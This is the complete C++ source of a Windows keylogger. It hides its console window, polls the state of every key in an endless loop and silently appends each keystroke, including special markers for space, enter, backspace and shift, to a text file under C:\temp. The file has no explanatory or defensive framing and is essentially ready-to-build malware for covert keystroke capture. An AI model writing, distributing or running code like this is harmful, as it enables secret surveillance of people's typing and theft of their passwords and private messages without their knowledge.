#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <filesystem>

#define DEBUG 0

void writeToLog(LPCSTR text) {
	std::ofstream logfile; //create file object
	logfile.open("C:\\temp\\keylogs.txt", std::fstream::app);
	logfile << text; //append text to file
	logfile.close(); //close stream
}

bool keyIsListen(int keyCode) {
	switch (keyCode)
	{
	case VK_SPACE:
		#if DEBUG == 1
			std::cout << " ";
		#endif
		writeToLog(" ");
		return true;
		break;
	case VK_RETURN:
		#if DEBUG == 1
			std::cout << "\n";
		#endif
		writeToLog("\n");
		return true;
		break;
	case VK_BACK:
		#if DEBUG == 1
			std::cout << "\b";
		#endif
		writeToLog("\b");
		return true;
		break;
	case VK_SHIFT:
		#if DEBUG == 1
			std::cout << " *SHIFT* ";
		#endif
		writeToLog(" *SHIFT* ");
		return true;
		break;

	default:
		return false;
		break;
	}
}

int main() {
	#if DEBUG == 0
		HWND hWnd = GetConsoleWindow();
		ShowWindow(hWnd, SW_HIDE); // hide console window
	#endif // !DEBUG

	unsigned char key;

	std::filesystem::create_directory("C:\\temp");

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) & 0x1) {
				if (!keyIsListen(key)) {
					std::ofstream logfile; //create file object
					logfile.open("C:\\temp\\keylogs.txt", std::fstream::app);
					logfile << key; //append text to file
					logfile.close(); //close stream
					#if DEBUG == 1
						std::cout << key;
					#endif
				}
			}
		}
	}

	return 0;
}